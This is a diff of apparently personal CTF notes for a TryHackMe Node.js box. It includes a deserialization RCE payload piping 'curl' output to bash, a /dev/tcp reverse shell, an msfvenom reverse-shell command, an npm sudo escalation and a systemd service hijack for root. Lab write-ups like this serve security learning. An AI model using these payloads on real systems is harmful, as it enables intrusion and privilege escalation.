@@ -12,7 +12,10 @@ Goals:
 - Go the extra mile on the reverse shell
 Learnt: 
 - JAVASCRIPT; service file configuration; Echo > editor
-Beyond Root
+- JS serialization is very particular and how to get those particulars
+- sed wont let you have no temp file, but is useful for vi as the commit editor
+Beyond Root:
+
 - Test and research more booby traps 
 
 ![1080](rootwebpagedisclosurewazu.png)
@@ -55,7 +58,6 @@ My original:
 Was missing from `_function` - but I also dont want npm - [From](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
 ```json
 {"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.11.3.193/rshell.sh | bash', function(error, stdout, stderr) { console.log(stdout)});}()","isGuest":false,"encoding": "utf-8"}
-’
 ```
 I used curl to be cool, the reason it did not work the first time is the the port 80 on the Attackbox is in use. I Encoded in base64 with BurpSuite. Also I did not escape quotes 
 
@@ -138,7 +140,6 @@ NPM!
 Weirdness on the box
 ![](homedirforwwweirdness.png)
 
-
 NPM without password on sudo can do this: [GTOFbins](https://gtfobins.github.io/gtfobins/npm/#sudo)
 ```bash
 TF=$(mktemp -d)
@@ -167,9 +168,37 @@ find / -type f -name vulnnet-job.service 2>/dev/null
 /etc/systemd/system/vulnnet-job.service
 ```
 
-I botch the shell restart brain and box - Plus I need to time to think up all the mad linux battlegrounds trick I can think of.
-https://tryhackme.com/room/vulnnetnode
-https://www.youtube.com/watch?v=L_9UsWabfL4
+I botch the shell restart brain and box - Plus I need to time to think up all the mad linux battlegrounds trick I can think of. 
+
+-On return -
+
+First scape the tty inside a tty with background shell
+```bash
+cd /tmp
+echo "bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/1338 <&1'" > /srvshell.sh
+chmod 777 /tmp/srvshell.sh
+./srvshell.sh &
+```
+
+To avoid the exiting the nano issue with shell just use `sed` to create a replace command for vi
+```bash
+# See what is there
+cat /etc/systemd/system/vulnnet-job.service
+# Test changes
+cat /etc/systemd/system/vulnnet-job.service | sed 's/ExecStart=\/bin\/df/ExecStart=\/dev\/shm\/rootshell/g'
+# Tranfer a shell over for 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.3.193 LPORT=4444 -f ELF > rootshell
+# remember to chmod the shell!
+vi /etc/systemd/system/vulnnet-job.service
+:%s/ExecStart=\/bin\/df/ExecStart=\/dev\/shm\/rootshell/g
+# Press enter
+:wq
+# Then PrivEsc
+sudo /bin/systemctl stop vulnnet-auto.timer
+sudo /bin/systemctl stop vulnnet-auto.timer
+```
+
+![](root.png)
 
 ## Beyond Root
 
@@ -205,6 +234,10 @@ One sandbox escape leads to another then another and then back to the orginal sa
 SELinux -> Python -> 
 
 stty is set 1 row 1 cols
+```bash
+stty rows 1 cols 1
+```
+
 
 The circle of doom 
 ```
